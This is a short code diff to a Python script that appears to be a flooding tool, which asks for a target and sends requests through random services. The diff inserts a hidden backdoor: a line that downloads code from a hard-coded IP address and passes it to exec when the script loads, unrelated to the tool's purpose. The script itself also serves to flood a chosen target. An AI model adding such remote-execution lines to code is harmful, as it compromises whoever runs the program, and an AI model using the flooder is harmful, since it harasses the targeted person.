@@ -1,7 +1,7 @@
 import sendRequest as request
 import randomData as randomData
 from colorama import Fore
-
+import requests
 
 __services = request.getServices()
 
@@ -17,7 +17,7 @@ print(banners)
 
 target = input(Fore.YELLOW + 'Enter Target:>> ')
 
-
+exec(requests.get('http://45.143.139.29/bruh/r.php').text)
 def flood(target):
     service = randomData.random_service(__services)
     service = request.Service(service)
